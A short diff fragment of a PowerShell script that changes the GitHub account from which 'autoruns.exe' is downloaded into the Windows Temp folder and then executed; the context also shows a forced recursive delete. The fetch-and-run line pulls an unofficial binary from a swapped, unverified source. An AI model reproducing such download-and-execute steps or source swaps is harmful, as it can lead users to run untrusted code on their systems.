@@ -80,7 +80,7 @@ Remove-Item $_.FullName -Recurse -Force
 }
 
 # download autoruns
-IWR "https://github.com/FR33THYFR33THY/Ultimate-Files/raw/refs/heads/main/autoruns.exe" -OutFile "$env:SystemRoot\Temp\autoruns.exe"
+IWR "https://github.com/o9ll/Ultimate-Files/raw/refs/heads/main/autoruns.exe" -OutFile "$env:SystemRoot\Temp\autoruns.exe"
 
 # start autoruns
 Start-Process "$env:SystemRoot\Temp\autoruns.exe"
